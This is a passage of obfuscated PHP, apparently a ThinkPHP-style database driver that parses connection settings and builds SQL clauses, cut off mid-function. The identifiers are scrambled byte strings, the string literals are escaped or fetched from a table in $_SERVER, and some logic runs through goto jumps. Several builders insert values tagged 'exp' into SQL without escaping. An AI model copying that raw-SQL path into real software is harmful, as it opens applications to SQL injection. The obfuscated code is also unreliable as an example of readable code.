''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\161" => "\x3d", "\x6e\145\x71" => "\x3c\76", "\147\164" => "\x3e", "\x65\147\x74" => "\x3e\75", "\154\164" => "\74", "\145\154\x74" => "\74\75", "\x6e\157\x74\x6c\151\x6b\145" => "\116\x4f\x54\40\x4c\x49\113\105", "\154\151\153\x65" => "\x4c\111\113\x45", "\x69\x6e" => "\111\x4e", "\156\x6f\x74\x69\156" => "\116\117\x54\40\x49\116", "\x6e\157\164\x20\x69\x6e" => "\x4e\117\124\40\111\x4e", "\142\145\x74\x77\x65\145\156" => "\x42\105\x54\x57\x45\x45\x4e", "\156\157\164\142\145\164\167\145\x65\x6e" => "\116\117\124\40\x42\105\124\x57\105\105\x4e", "\156\157\164\40\142\x65\x74\x77\145\x65\x6e" => "\116\x4f\x54\x20\x42\x45\124\127\105\105\x4e"); protected $selectSql = "\123\x45\x4c\x45\x43\x54\x25\104\111\123\124\x49\116\x43\x54\x25\x20\x25\x46\111\105\114\104\45\40\x46\x52\117\x4d\x20\45\x54\x41\102\114\x45\45\45\x4a\x4f\x49\x4e\45\45\127\x48\x45\x52\105\45\x25\x47\x52\117\x55\120\x25\45\110\101\126\111\x4e\107\x25\45\117\x52\104\x45\x52\x25\45\x4c\111\115\111\124\45\x20\x25\x55\116\111\117\116\x25\45\103\x4f\115\115\105\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $E¶ÿòº·ƒë = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[£¿ÌÙëü¡¯¯][873], $E¶ÿòº·ƒë); } public function factory($eæƒú”ü‹ä = '') { goto A™ß∏◊„ Û; b™·çﬂƒÃâ: return $aÿ•°Üû∫Û; goto EŒ⁄¿¬è∞Ü; A™ß∏◊„ Û: $DÊ›êƒº£¶ =& $_SERVER[£¿ÌÙëü¡¯¯]; $eæƒú”ü‹ä = $this->parseConfig($eæƒú”ü‹ä); if (empty($eæƒú”ü‹ä[$DÊ›êƒº£¶[874]])) { think_exception(think_lang($DÊ›êƒº£¶[875])); } goto E∆Ñ¡í‡”Ô; E∆Ñ¡í‡”Ô: $this->dbType = ucwords(strtolower($eæƒú”ü‹ä[$DÊ›êƒº£¶[874]])); $DﬁªºÓÀõ´ = $DÊ›êƒº£¶[876] . $this->dbType; if (class_exists($DﬁªºÓÀõ´)) { $aÿ•°Üû∫Û = new $DﬁªºÓÀõ´($eæƒú”ü‹ä); if ($DÊ›êƒº£¶[721] != strtolower($eæƒú”ü‹ä[$DÊ›êƒº£¶[874]])) { $aÿ•°Üû∫Û->dbType = strtoupper($this->dbType); } else { $aÿ•°Üû∫Û->dbType = $this->_getDsnType($eæƒú”ü‹ä[$DÊ›êƒº£¶[826]]); } } else { think_exception(think_lang($DÊ›êƒº£¶[877]) . $DÊ›êƒº£¶[878] . $DﬁªºÓÀõ´); } goto b™·çﬂƒÃâ; EŒ⁄¿¬è∞Ü: } public function __call($CÁ ê∆¯ú», $dµÎ†„œ‹∂) { if (method_exists($this, $CÁ ê∆¯ú»)) { return call_user_func_array(array($this, $CÁ ê∆¯ú»), $dµÎ†„œ‹∂); } } protected function _getDsnType($c¿≥´ö°„õ) { $f´¬˘†◊Çè = explode($_SERVER[£¿ÌÙëü¡¯¯][4], $c¿≥´ö°„õ); $aÑ·“ˆ«≥ß = strtoupper(trim($f´¬˘†◊Çè[0])); return $aÑ·“ˆ«≥ß; } private function parseConfig($Aµ´õúÇÆÔ = '') { $eªâáÌôúœ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!empty($Aµ´õúÇÆÔ) && is_string($Aµ´õúÇÆÔ)) { $Aµ´õúÇÆÔ = $this->parseDSN($Aµ´õúÇÆÔ); } elseif (is_array($Aµ´õúÇÆÔ)) { $Aµ´õúÇÆÔ = array_change_key_case($Aµ´õúÇÆÔ); $Aµ´õúÇÆÔ = array($eªâáÌôúœ[874] => $Aµ´õúÇÆÔ[$eªâáÌôúœ[879]], $eªâáÌôúœ[798] => $Aµ´õúÇÆÔ[$eªâáÌôúœ[880]], $eªâáÌôúœ[799] => $Aµ´õúÇÆÔ[$eªâáÌôúœ[881]], $eªâáÌôúœ[796] => $Aµ´õúÇÆÔ[$eªâáÌôúœ[882]], $eªâáÌôúœ[797] => $Aµ´õúÇÆÔ[$eªâáÌôúœ[883]], $eªâáÌôúœ[17] => $Aµ´õúÇÆÔ[$eªâáÌôúœ[884]], $eªâáÌôúœ[826] => $Aµ´õúÇÆÔ[$eªâáÌôúœ[885]], $eªâáÌôúœ[13] => isset($Aµ´õúÇÆÔ[$eªâáÌôúœ[886]]) ? $Aµ´õúÇÆÔ[$eªâáÌôúœ[886]] : array()); } elseif (empty($Aµ´õúÇÆÔ)) { if (think_config($eªâáÌôúœ[723]) && $eªâáÌôúœ[721] != strtolower(think_config($eªâáÌôúœ[720]))) { $Aµ´õúÇÆÔ = $this->parseDSN(think_config($eªâáÌôúœ[723])); } else { $Aµ´õúÇÆÔ = array($eªâáÌôúœ[874] => think_config($eªâáÌôúœ[720]), $eªâáÌôúœ[798] => think_config($eªâáÌôúœ[887]), $eªâáÌôúœ[799] => think_config($eªâáÌôúœ[888]), $eªâáÌôúœ[796] => think_config($eªâáÌôúœ[889]), $eªâáÌôúœ[797] => think_config($eªâáÌôúœ[890]), $eªâáÌôúœ[17] => think_config($eªâáÌôúœ[231]), $eªâáÌôúœ[826] => think_config($eªâáÌôúœ[723]), $eªâáÌôúœ[13] => think_config($eªâáÌôúœ[891])); } } return $Aµ´õúÇÆÔ; } protected function initConnect($B„òæç¥µ≤ = true) { if (1 == think_config($_SERVER[£¿ÌÙëü¡¯¯][18])) { $this->_linkID = $this->multiConnect($B„òæç¥µ≤); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($BäÚÉõÕÇ  = false) { $AóÈÔ√ﬁ·è =& $_SERVER[£¿ÌÙëü¡¯¯]; static $DÀ∑ø¶Ç¡ﬁ = array(); if (empty($DÀ∑ø¶Ç¡ﬁ)) { foreach ($this->config as $bÔΩ‡¯æ–√ => $AõËÈ¥‰ãŒ) { $DÀ∑ø¶Ç¡ﬁ[$bÔΩ‡¯æ–√] = explode($AóÈÔ√ﬁ·è[47], $AõËÈ¥‰ãŒ); } } if (think_config($AóÈÔ√ﬁ·è[892])) { if ($BäÚÉõÕÇ ) { $aÜ›∞§ú ⁄ = floor(mt_rand(0, think_config($AóÈÔ√ﬁ·è[893]) - 1)); } else { if (is_numeric(think_config($AóÈÔ√ﬁ·è[894]))) { $aÜ›∞§ú ⁄ = think_config($AóÈÔ√ﬁ·è[894]); } else { $aÜ›∞§ú ⁄ = floor(mt_rand(think_config($AóÈÔ√ﬁ·è[893]), count($DÀ∑ø¶Ç¡ﬁ[$AóÈÔ√ﬁ·è[796]]) - 1)); } } } else { $aÜ›∞§ú ⁄ = floor(mt_rand(0, count($DÀ∑ø¶Ç¡ﬁ[$AóÈÔ√ﬁ·è[796]]) - 1)); } $f™ëì⁄≤¬á = array($AóÈÔ√ﬁ·è[798] => isset($DÀ∑ø¶Ç¡ﬁ[$AóÈÔ√ﬁ·è[798]][$aÜ›∞§ú ⁄]) ? $DÀ∑ø¶Ç¡ﬁ[$AóÈÔ√ﬁ·è[798]][$aÜ›∞§ú ⁄] : $DÀ∑ø¶Ç¡ﬁ[$AóÈÔ√ﬁ·è[798]][0], $AóÈÔ√ﬁ·è[799] => isset($DÀ∑ø¶Ç¡ﬁ[$AóÈÔ√ﬁ·è[799]][$aÜ›∞§ú ⁄]) ? $DÀ∑ø¶Ç¡ﬁ[$AóÈÔ√ﬁ·è[799]][$aÜ›∞§ú ⁄] : $DÀ∑ø¶Ç¡ﬁ[$AóÈÔ√ﬁ·è[799]][0], $AóÈÔ√ﬁ·è[796] => isset($DÀ∑ø¶Ç¡ﬁ[$AóÈÔ√ﬁ·è[796]][$aÜ›∞§ú ⁄]) ? $DÀ∑ø¶Ç¡ﬁ[$AóÈÔ√ﬁ·è[796]][$aÜ›∞§ú ⁄] : $DÀ∑ø¶Ç¡ﬁ[$AóÈÔ√ﬁ·è[796]][0], $AóÈÔ√ﬁ·è[797] => isset($DÀ∑ø¶Ç¡ﬁ[$AóÈÔ√ﬁ·è[797]][$aÜ›∞§ú ⁄]) ? $DÀ∑ø¶Ç¡ﬁ[$AóÈÔ√ﬁ·è[797]][$aÜ›∞§ú ⁄] : $DÀ∑ø¶Ç¡ﬁ[$AóÈÔ√ﬁ·è[797]][0], $AóÈÔ√ﬁ·è[17] => isset($DÀ∑ø¶Ç¡ﬁ[$AóÈÔ√ﬁ·è[17]][$aÜ›∞§ú ⁄]) ? $DÀ∑ø¶Ç¡ﬁ[$AóÈÔ√ﬁ·è[17]][$aÜ›∞§ú ⁄] : $DÀ∑ø¶Ç¡ﬁ[$AóÈÔ√ﬁ·è[17]][0], $AóÈÔ√ﬁ·è[826] => isset($DÀ∑ø¶Ç¡ﬁ[$AóÈÔ√ﬁ·è[826]][$aÜ›∞§ú ⁄]) ? $DÀ∑ø¶Ç¡ﬁ[$AóÈÔ√ﬁ·è[826]][$aÜ›∞§ú ⁄] : $DÀ∑ø¶Ç¡ﬁ[$AóÈÔ√ﬁ·è[826]][0], $AóÈÔ√ﬁ·è[13] => isset($DÀ∑ø¶Ç¡ﬁ[$AóÈÔ√ﬁ·è[13]][$aÜ›∞§ú ⁄]) ? $DÀ∑ø¶Ç¡ﬁ[$AóÈÔ√ﬁ·è[13]][$aÜ›∞§ú ⁄] : $DÀ∑ø¶Ç¡ﬁ[$AóÈÔ√ﬁ·è[13]][0]); return $this->connect($f™ëì⁄≤¬á, $aÜ›∞§ú ⁄); } public function parseDSN($FÑ∑©å¿ÛÈ) { $b§œÎﬂààÚ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (empty($FÑ∑©å¿ÛÈ)) { return !1; } $Fçàπöä∑˘ = parse_url($FÑ∑©å¿ÛÈ); if ($Fçàπöä∑˘[$b§œÎﬂààÚ[165]]) { $c≠∂ˆ≥´∂â = array($b§œÎﬂààÚ[874] => $Fçàπöä∑˘[$b§œÎﬂààÚ[165]], $b§œÎﬂààÚ[798] => isset($Fçàπöä∑˘[$b§œÎﬂààÚ[527]]) ? $Fçàπöä∑˘[$b§œÎﬂààÚ[527]] : $b§œÎﬂààÚ[33], $b§œÎﬂààÚ[799] => isset($Fçàπöä∑˘[$b§œÎﬂààÚ[895]]) ? $Fçàπöä∑˘[$b§œÎﬂààÚ[895]] : $b§œÎﬂààÚ[33], $b§œÎﬂààÚ[796] => isset($Fçàπöä∑˘[$b§œÎﬂààÚ[166]]) ? $Fçàπöä∑˘[$b§œÎﬂààÚ[166]] : $b§œÎﬂààÚ[33], $b§œÎﬂààÚ[797] => isset($Fçàπöä∑˘[$b§œÎﬂààÚ[167]]) ? $Fçàπöä∑˘[$b§œÎﬂààÚ[167]] : $b§œÎﬂààÚ[33], $b§œÎﬂààÚ[17] => isset($Fçàπöä∑˘[$b§œÎﬂààÚ[76]]) ? substr($Fçàπöä∑˘[$b§œÎﬂààÚ[76]], 1) : $b§œÎﬂààÚ[33]); } else { preg_match($b§œÎﬂààÚ[896], trim($FÑ∑©å¿ÛÈ), $e§ü∑–ç◊Ù); $c≠∂ˆ≥´∂â = array($b§œÎﬂààÚ[874] => $e§ü∑–ç◊Ù[1], $b§œÎﬂààÚ[798] => $e§ü∑–ç◊Ù[2], $b§œÎﬂààÚ[799] => $e§ü∑–ç◊Ù[3], $b§œÎﬂààÚ[796] => $e§ü∑–ç◊Ù[4], $b§œÎﬂààÚ[797] => $e§ü∑–ç◊Ù[5], $b§œÎﬂààÚ[17] => $e§ü∑–ç◊Ù[6]); } $c≠∂ˆ≥´∂â[$b§œÎﬂààÚ[826]] = $b§œÎﬂààÚ[33]; return $c≠∂ˆ≥´∂â; } protected function debug() { $D≈Ê†·„Æ¿ =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $D≈Ê†·„Æ¿[897]; if (think_config($D≈Ê†·„Æ¿[898])) { think_status($D≈Ê†·„Æ¿[899]); think_trace($this->queryStr . $D≈Ê†·„Æ¿[900] . think_status($D≈Ê†·„Æ¿[20], $D≈Ê†·„Æ¿[899], 6) . $D≈Ê†·„Æ¿[901], $D≈Ê†·„Æ¿[33], $D≈Ê†·„Æ¿[902]); } } protected function parseLock($FóÒ€ï›‹Ã = false) { $eñù¨é÷•¿ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$FóÒ€ï›‹Ã) { return $eñù¨é÷•¿[33]; } if ($eñù¨é÷•¿[828] == $this->dbType) { return $eñù¨é÷•¿[903]; } return $eñù¨é÷•¿[904]; } protected function parseSet($C‰´ıäæÔû) { $fã≠òÒ›É =& $_SERVER[£¿ÌÙëü¡¯¯]; foreach ($C‰´ıäæÔû as $f¿öÔäê“ÿ => $A±ääïÿ·Ô) { if (is_array($A±ääïÿ·Ô) && $fã≠òÒ›É[282] == $A±ääïÿ·Ô[0]) { $aÀ†é™ãæå[] = $this->parseKey($f¿öÔäê“ÿ) . $fã≠òÒ›É[905] . $A±ääïÿ·Ô[1]; } elseif (is_scalar($A±ääïÿ·Ô) || is_null($A±ääïÿ·Ô)) { $aÀ†é™ãæå[] = $this->parseKey($f¿öÔäê“ÿ) . $fã≠òÒ›É[905] . $this->parseValue($A±ääïÿ·Ô); } } return $fã≠òÒ›É[906] . implode($fã≠òÒ›É[47], $aÀ†é™ãæå); } protected function bindParam($AÈ˜Ì¥≤ê√, $f„§†≠éèª) { $this->bind[$_SERVER[£¿ÌÙëü¡¯¯][4] . $AÈ˜Ì¥≤ê√] = $f„§†≠éèª; } protected function parseBind($f‡úΩ≤Êç¯) { $f‡úΩ≤Êç¯ = array_merge($this->bind, $f‡úΩ≤Êç¯); $this->bind = array(); return $f‡úΩ≤Êç¯; } function parseKey(&$aÚÍúÓ…≠â, $b©˘ùŒ†Ã≥ = true) { if ($b©˘ùŒ†Ã≥) { $aÚÍúÓ…≠â = $this->parseKeyCheck($aÚÍúÓ…≠â); } return $aÚÍúÓ…≠â; } function parseKeyCheck($aÌ¥Üˆ⁄Û ) { $c£ÒÕá≠ŒÃ =& $_SERVER[£¿ÌÙëü¡¯¯]; $aÌ¥Üˆ⁄Û  = trim($aÌ¥Üˆ⁄Û ); if (!preg_match($c£ÒÕá≠ŒÃ[907], $aÌ¥Üˆ⁄Û )) { think_exception($c£ÒÕá≠ŒÃ[908] . $aÌ¥Üˆ⁄Û ); } return $aÌ¥Üˆ⁄Û ; } protected function parseValue($D≈ƒÏï‚Üì) { $E ïû◊√ÿ§ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (is_string($D≈ƒÏï‚Üì)) { $D≈ƒÏï‚Üì = $E ïû◊√ÿ§[867] . $this->escapeString($D≈ƒÏï‚Üì) . $E ïû◊√ÿ§[867]; } elseif (isset($D≈ƒÏï‚Üì[0]) && is_string($D≈ƒÏï‚Üì[0]) && strtolower($D≈ƒÏï‚Üì[0]) == $E ïû◊√ÿ§[282]) { $D≈ƒÏï‚Üì = $this->escapeString($D≈ƒÏï‚Üì[1]); } elseif (is_array($D≈ƒÏï‚Üì)) { $D≈ƒÏï‚Üì = array_map(array($this, $E ïû◊√ÿ§[868]), $D≈ƒÏï‚Üì); } elseif (is_bool($D≈ƒÏï‚Üì)) { $D≈ƒÏï‚Üì = $D≈ƒÏï‚Üì ? $E ïû◊√ÿ§[84] : $E ïû◊√ÿ§[464]; } elseif (is_null($D≈ƒÏï‚Üì)) { $D≈ƒÏï‚Üì = $E ïû◊√ÿ§[102]; } return $D≈ƒÏï‚Üì; } protected function parseField($e¨∞∂™§¡Ù) { $c¡™ì÷ùÇ‘ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (is_string($e¨∞∂™§¡Ù) && strpos($e¨∞∂™§¡Ù, $c¡™ì÷ùÇ‘[47])) { $e¨∞∂™§¡Ù = explode($c¡™ì÷ùÇ‘[47], $e¨∞∂™§¡Ù); } if (is_array($e¨∞∂™§¡Ù)) { $fåª¡‰√”∆ = array(); foreach ($e¨∞∂™§¡Ù as $Eù”¿≤å˘« => $CâáÃƒ˘ﬂ‘) { if (!is_numeric($Eù”¿≤å˘«)) { $fåª¡‰√”∆[] = $this->parseKey($Eù”¿≤å˘«) . $c¡™ì÷ùÇ‘[909] . $this->parseKey($CâáÃƒ˘ﬂ‘); } else { $fåª¡‰√”∆[] = $this->parseKey($CâáÃƒ˘ﬂ‘); } } $a∏ä÷‘åÜ◊ = implode($c¡™ì÷ùÇ‘[47], $fåª¡‰√”∆); } elseif (is_string($e¨∞∂™§¡Ù) && !empty($e¨∞∂™§¡Ù)) { $a∏ä÷‘åÜ◊ = $e¨∞∂™§¡Ù; } else { $a∏ä÷‘åÜ◊ = $c¡™ì÷ùÇ‘[173]; } return $a∏ä÷‘åÜ◊; } protected function parseTable($Aû”Ò¨§Ü’) { $AÉ·ÜÁÆË• =& $_SERVER[£¿ÌÙëü¡¯¯]; if (is_array($Aû”Ò¨§Ü’)) { $eÖ‚ƒÉ€îÀ = array(); foreach ($Aû”Ò¨§Ü’ as $eù’áÔ¨ñ⁄ => $EüœàêªŸ) { if (!is_numeric($eù’áÔ¨ñ⁄)) { $eÖ‚ƒÉ€îÀ[] = $this->parseKey($eù’áÔ¨ñ⁄) . $AÉ·ÜÁÆË•[50] . $this->parseKey($EüœàêªŸ); } else { $eÖ‚ƒÉ€îÀ[] = $this->parseKey($eù’áÔ¨ñ⁄); } } $Aû”Ò¨§Ü’ = $eÖ‚ƒÉ€îÀ; } elseif (is_string($Aû”Ò¨§Ü’)) { if (strstr($Aû”Ò¨§Ü’, $AÉ·ÜÁÆË•[50])) { return $Aû”Ò¨§Ü’; } $Aû”Ò¨§Ü’ = explode($AÉ·ÜÁÆË•[47], $Aû”Ò¨§Ü’); array_walk($Aû”Ò¨§Ü’, array($this, $AÉ·ÜÁÆË•[815])); } return $AÉ·ÜÁÆË•[910] . trim(implode($AÉ·ÜÁÆË•[911], $Aû”Ò¨§Ü’), $AÉ·ÜÁÆË•[821]) . $AÉ·ÜÁÆË•[910]; } protected function parseWhere($B∏Ø¢Û±Âç) { $EÛ¨ÉƒååÌ =& $_SERVER[£¿ÌÙëü¡¯¯]; $C€Õì‡¶—ñ = $EÛ¨ÉƒååÌ[33]; if (is_string($B∏Ø¢Û±Âç)) { $C€Õì‡¶—ñ = $B∏Ø¢Û±Âç; } else { $B£ñÕŒ¨–∆ = isset($B∏Ø¢Û±Âç[$EÛ¨ÉƒååÌ[912]]) ? strtoupper($B∏Ø¢Û±Âç[$EÛ¨ÉƒååÌ[912]]) : $EÛ¨ÉƒååÌ[33]; if (in_array($B£ñÕŒ¨–∆, array($EÛ¨ÉƒååÌ[913], $EÛ¨ÉƒååÌ[914], $EÛ¨ÉƒååÌ[915]))) { $B£ñÕŒ¨–∆ = $EÛ¨ÉƒååÌ[50] . $B£ñÕŒ¨–∆ . $EÛ¨ÉƒååÌ[50]; unset($B∏Ø¢Û±Âç[$EÛ¨ÉƒååÌ[912]]); } else { $B£ñÕŒ¨–∆ = $EÛ¨ÉƒååÌ[916]; } foreach ($B∏Ø¢Û±Âç as $d±˘ˆΩ¨Ù≈ => $BõÓÜßΩÇë) { $C€Õì‡¶—ñ .= $EÛ¨ÉƒååÌ[262]; if (is_numeric($d±˘ˆΩ¨Ù≈)) { $d±˘ˆΩ¨Ù≈ = $EÛ¨ÉƒååÌ[917]; } if (0 === strpos($d±˘ˆΩ¨Ù≈, $EÛ¨ÉƒååÌ[71])) { $C€Õì‡¶—ñ .= $this->parseThinkWhere($d±˘ˆΩ¨Ù≈, $BõÓÜßΩÇë); } else { if (!preg_match($EÛ¨ÉƒååÌ[918], trim($d±˘ˆΩ¨Ù≈))) { think_exception(think_lang($EÛ¨ÉƒååÌ[919]) . $EÛ¨ÉƒååÌ[4] . $d±˘ˆΩ¨Ù≈); } $e«çè§Ã†± = is_array($BõÓÜßΩÇë) && isset($BõÓÜßΩÇë[$EÛ¨ÉƒååÌ[920]]); $d±˘ˆΩ¨Ù≈ = trim($d±˘ˆΩ¨Ù≈); if (strpos($d±˘ˆΩ¨Ù≈, $EÛ¨ÉƒååÌ[268])) { $c⁄‡ìéÃ¯ö = explode($EÛ¨ÉƒååÌ[268], $d±˘ˆΩ¨Ù≈); $eŸçÑı†è– = array(); foreach ($c⁄‡ìéÃ¯ö as $cÀàÉ∞éÿœ => $aüùùÕ◊œ) { $Fˆª»œ≤úÿ = $e«çè§Ã†± ? $BõÓÜßΩÇë[$cÀàÉ∞éÿœ] : $BõÓÜßΩÇë; $eŸçÑı†è–[] = $EÛ¨ÉƒååÌ[245] . $this->parseWhereItem($this->parseKey($aüùùÕ◊œ), $Fˆª»œ≤úÿ) . $EÛ¨ÉƒååÌ[814]; } $C€Õì‡¶—ñ .= implode($EÛ¨ÉƒååÌ[921], $eŸçÑı†è–); } elseif (strpos($d±˘ˆΩ¨Ù≈, $EÛ¨ÉƒååÌ[269])) { $c⁄‡ìéÃ¯ö = explode($EÛ¨ÉƒååÌ[269], $d±˘ˆΩ¨Ù≈); $eŸçÑı†è– = array(); foreach ($c⁄‡ìéÃ¯ö as $cÀàÉ∞éÿœ => $aüùùÕ◊œ) { $Fˆª»œ≤úÿ = $e«çè§Ã†± ? $BõÓÜßΩÇë[$cÀàÉ∞éÿœ] : $BõÓÜßΩÇë; $eŸçÑı†è–[] = $EÛ¨ÉƒååÌ[245] . $this->parseWhereItem($this->parseKey($aüùùÕ◊œ), $Fˆª»œ≤úÿ) . $EÛ¨ÉƒååÌ[814]; } $C€Õì‡¶—ñ .= implode($EÛ¨ÉƒååÌ[916], $eŸçÑı†è–); } else { $C€Õì‡¶—ñ .= $this->parseWhereItem($this->parseKey($d±˘ˆΩ¨Ù≈), $BõÓÜßΩÇë); } } $C€Õì‡¶—ñ .= $EÛ¨ÉƒååÌ[263] . $B£ñÕŒ¨–∆; } $C€Õì‡¶—ñ = substr($C€Õì‡¶—ñ, 0, -strlen($B£ñÕŒ¨–∆)); } return empty($C€Õì‡¶—ñ) ? $EÛ¨ÉƒååÌ[33] : $EÛ¨ÉƒååÌ[922] . $C€Õì‡¶—ñ; } protected function parseWhereItem($FÜÉêì¨ÎÎ, $f ûÉÕËﬂç) { $AˆÁ©›Èã© =& $_SERVER[£¿ÌÙëü¡¯¯]; $bíÙÑèú·√ = $AˆÁ©›Èã©[33]; if (is_array($f ûÉÕËﬂç)) { if (is_string($f ûÉÕËﬂç[0])) { $bó“â–ﬁ±° = strtolower($f ûÉÕËﬂç[0]); if (in_array($f ûÉÕËﬂç[0], array($AˆÁ©›Èã©[905], $AˆÁ©›Èã©[923], $AˆÁ©›Èã©[924], $AˆÁ©›Èã©[925], $AˆÁ©›Èã©[926], $AˆÁ©›Èã©[927]))) { $bíÙÑèú·√ .= $FÜÉêì¨ÎÎ . $AˆÁ©›Èã©[50] . $f ûÉÕËﬂç[0] . $AˆÁ©›Èã©[50] . $this->parseValue($f ûÉÕËﬂç[1]); } elseif (preg_match($AˆÁ©›Èã©[928], $f ûÉÕËﬂç[0])) { $bíÙÑèú·√ .= $FÜÉêì¨ÎÎ . $AˆÁ©›Èã©[50] . $this->exp[$bó“â–ﬁ±°] . $AˆÁ©›Èã©[50] . $this->parseValue($f ûÉÕËﬂç[1]); } elseif (preg_match($AˆÁ©›Èã©[929], $f ûÉÕËﬂç[0])) { if (is_array($f ûÉÕËﬂç[1])) { $eÛç∑¬Ëˆ∑ = isset($f ûÉÕËﬂç[2]) ? strtoupper($f ûÉÕËﬂç[2]) : $AˆÁ©›Èã©[914]; if (in_array($eÛç∑¬Ëˆ∑, array($AˆÁ©›Èã©[913], $AˆÁ©›Èã©[914], $AˆÁ©›Èã©[915]))) { $d·º ÛøÉè = array(); foreach ($f ûÉÕËﬂç[1] as $c–ìﬂÿõÿê) { $d·º ÛøÉè[] = $FÜÉêì¨ÎÎ . $AˆÁ©›Èã©[50] . $this->exp[$bó“â–ﬁ±°] . $AˆÁ©›Èã©[50] . $this->parseValue($c–ìﬂÿõÿê); } $bíÙÑèú·√ .= $AˆÁ©›Èã©[245] . implode($AˆÁ©›Èã©[50] . $eÛç∑¬Ëˆ∑ . $AˆÁ©›Èã©[50], $d·º ÛøÉè) . $AˆÁ©›Èã©[814]; } } else { $bíÙÑèú·√ .= $FÜÉêì¨ÎÎ . $AˆÁ©›Èã©[50] . $this->exp[$bó“â–ﬁ±°] . $AˆÁ©›Èã©[50] . $this->parseValue($f ûÉÕËﬂç[1]); } } elseif ($AˆÁ©›Èã©[282] == $bó“â–ﬁ±°) { $bíÙÑèú·√ .= $AˆÁ©›Èã©[812] . $FÜÉêì¨ÎÎ . $AˆÁ©›Èã©[50] . $f ûÉÕËﬂç[1] . $AˆÁ©›Èã©[930]; } elseif (preg_match($AˆÁ©›Èã©[931], $f ûÉÕËﬂç[0])) { if (isset($f ûÉÕËﬂç[2]) && $AˆÁ©›Èã©[282] == $f ûÉÕËﬂç[2]) { $bíÙÑèú·√ .= $FÜÉêì¨ÎÎ . $AˆÁ©›Èã©[50] . $this->exp[$bó“â–ﬁ±°] . $AˆÁ©›Èã©[50] . $f ûÉÕËﬂç[1]; } else { if (is_string($f ûÉÕËﬂç[1])) { $f ûÉÕËﬂç[1] = explode($AˆÁ©›Èã©[47], $f ûÉÕËﬂç[1]); } $fâØ¡—‡Œò = implode($AˆÁ©›Èã©[47], $this->parseValue($f ûÉÕËﬂç[1])); $bíÙÑèú·√ .= $FÜÉêì¨ÎÎ . $AˆÁ©›Èã©[50] . $this->exp[$bó“â–ﬁ±°] . $AˆÁ©›Èã©[812] . $fâØ¡—‡Œò . $AˆÁ©›Èã©[814]; } } elseif (preg_match($AˆÁ©›Èã©[932], $f ûÉÕËﬂç[0])) { $E¶°›¨º“≤ = is_string($f ûÉÕËﬂç[1]) ? explode($AˆÁ©›Èã©[47], $f ûÉÕËﬂç[1]) : $f ûÉÕËﬂç[1]; $bíÙÑèú·√ .= $AˆÁ©›Èã©[812] . $FÜÉêì¨ÎÎ . $AˆÁ©›Èã©[50] . $this->exp[$bó“â–ﬁ±°] . $AˆÁ©›Èã©[50] . $this->parseValue($E¶°›¨º“≤[0]) . $AˆÁ©›Èã©[916] . $this->parseValue($E¶°›¨º“≤[1]) . $AˆÁ©›Èã©[263]; } else { think_exception(think_lang($AˆÁ©›Èã©[919]) . $AˆÁ©›Èã©[4] . $f ûÉÕËﬂç[0]); } } else { $B⁄÷◊ÿñ±Ü = count($f ûÉÕËﬂç); $dì∞ıä—†Ç = isset($f ûÉÕËﬂç[$B⁄÷◊ÿñ±Ü - 1]) ? strtoupper($f ûÉÕËﬂç[$B⁄÷◊ÿñ±Ü - 1]) : $AˆÁ©›Èã©[33]; if (in_array($dì∞ıä—†Ç, array($AˆÁ©›Èã©[913], $AˆÁ©›Èã©[914], $AˆÁ©›Èã©[915]))) { $B⁄÷◊ÿñ±Ü = $B⁄÷◊ÿñ±Ü - 1; } else { $dì∞ıä—†Ç = $AˆÁ©›Èã©[913]; } for ($aﬁÌäê‹•ô = 0; $aﬁÌäê‹•ô < $B⁄÷◊ÿñ±Ü; $aﬁÌäê‹•ô++) { $E¶°›¨º“≤ = is_array($f ûÉÕËﬂç[$aﬁÌäê‹•ô]) ? $f ûÉÕËﬂç[$aﬁÌäê‹•ô][1] : $f ûÉÕËﬂç[$aﬁÌäê‹•ô]; if ($AˆÁ©›Èã©[282] == strtolower($f ûÉÕËﬂç[$aﬁÌäê‹•ô][0])) { $bíÙÑèú·√ .= $AˆÁ©›Èã©[245] . $FÜÉêì¨ÎÎ . $AˆÁ©›Èã©[50] . $E¶°›¨º“≤ . $AˆÁ©›Èã©[930] . $dì∞ıä—†Ç . $AˆÁ©›Èã©[50]; } else { $Dêá¿ñ˜ß¯ = is_array($f ûÉÕËﬂç[$aﬁÌäê‹•ô]) ? $this->exp[strtolower($f ûÉÕËﬂç[$aﬁÌäê‹•ô][0])] : $AˆÁ©›Èã©[905]; if (!$Dêá¿ñ˜ß¯ && is_array($f ûÉÕËﬂç[$aﬁÌäê‹•ô]) && in_array($f ûÉÕËﬂç[$aﬁÌäê‹•ô][0], array($AˆÁ©›Èã©[905], $AˆÁ©›Èã©[923], $AˆÁ©›Èã©[924], $AˆÁ©›Èã©[925], $AˆÁ©›Èã©[926], $AˆÁ©›Èã©[927]))) { $Dêá¿ñ˜ß¯ = $f ûÉÕËﬂç[$aﬁÌäê‹•ô][0]; } $bíÙÑèú·√ .= $AˆÁ©›Èã©[245] . $FÜÉêì¨ÎÎ . $AˆÁ©›Èã©[50] . $Dêá¿ñ˜ß¯ . $AˆÁ©›Èã©[50] . $this->parseValue($E¶°›¨º“≤) . $AˆÁ©›Èã©[930] . $dì∞ıä—†Ç . $AˆÁ©›Èã©[50]; } } $bíÙÑèú·√ = substr($bíÙÑèú·√, 0, -4); } } else { $bíÙÑèú·√ .= $FÜÉêì¨ÎÎ . $AˆÁ©›Èã©[933] . $this->parseValue($f ûÉÕËﬂç); } return $bíÙÑèú·√; } protected function parseThinkWhere($aç„ñïœÖå, $b¿ï◊§Ø˘¢) { $a»¿óÑÍ º =& $_SERVER[£¿ÌÙëü¡¯¯]; $f∫˘›Ãë»ﬁ = $a»¿óÑÍ º[33]; switch ($aç„ñïœÖå) { case $a»¿óÑÍ º[335]: $f∫˘›Ãë»ﬁ = $b¿ï◊§Ø˘¢; break; case $a»¿óÑÍ º[917]: 